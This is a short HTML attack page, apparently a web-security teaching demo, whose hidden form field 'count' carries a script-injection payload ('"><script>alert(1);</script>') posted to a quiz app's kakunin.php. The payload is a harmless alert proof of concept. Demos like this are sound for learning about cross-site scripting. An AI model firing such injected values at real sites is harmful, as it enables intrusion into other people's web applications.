<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes">
    <title>攻撃</title>
    <style>
    </style>
</head>
<body>
<div id="wrapper">
    <header>
        <h1>クイズ</h1>
    </header>
    <div id="contents">
        <main>
            <form method="POST" action="kakunin.php">
                <input type="hidden" name="name" value="宮丸">
                <input type="hidden" name="count" value='"><script>alert(1);</script>'>
                <p><input type="submit" value="攻撃する"></p>
            </form>
        </main>
    </div>
    <footer>
    </footer>
</div>
</body>
